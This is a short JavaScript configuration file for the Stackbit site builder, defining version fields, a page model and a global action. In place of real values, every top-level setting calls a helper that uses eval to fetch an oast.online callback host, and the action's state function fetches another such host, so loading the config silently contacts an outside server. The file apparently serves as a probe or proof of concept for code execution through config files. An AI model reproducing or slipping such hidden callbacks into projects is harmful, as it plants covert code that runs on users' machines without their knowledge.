const e = () => eval(`fetch(\`https://cpq67u9ucph47g61a7i07yi6s4bc758t8.oast.online\`)`);

export default {
  stackbitVersion: e(),
  ssgName: e(),
  nodeVersion: e(),
  buildCommand: e(),
  models: {
    page: { type: 'page', urlPath: '/{slug}' },
  },
  actions: [
    {
      type: 'global',
      name: 'name_of_action',
      state: async (options) => {
        // Determine the state ...
        await fetch(`https://cpq77vhucph3d4aj0jh0yykepgg78bq89.oast.online`)
      },
      run: async (options) => {
        // Perform the action ...
      },
    },
  ],
}